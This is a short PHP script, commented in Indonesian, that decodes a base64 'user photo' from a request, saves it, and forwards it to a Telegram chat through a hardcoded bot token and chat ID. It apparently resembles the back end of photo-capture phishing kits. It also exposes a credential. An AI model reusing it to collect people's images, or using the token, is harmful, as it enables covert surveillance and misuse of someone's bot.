<?php
// Mendapatkan data gambar dari request
$data = json_decode(file_get_contents('php://input'), true);
$image = $data['image'];

// Menghapus prefix data URL
$image = str_replace('data:image/png;base64,', '', $image);
$image = str_replace(' ', '+', $image);
$imageData = base64_decode($image);

// Menyimpan gambar ke server
$fileName = 'user_photo.png';
file_put_contents($fileName, $imageData);

// Mengirim gambar ke Telegram
$botToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
$chatId = '-1002188815934';
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendPhoto";

$photo = new CURLFile($fileName);
$postFields = [
    'chat_id' => $chatId,
    'photo' => $photo,
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Content-Type:multipart/form-data"
));
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
$output = curl_exec($ch);
curl_close($ch);

echo $output;
?>
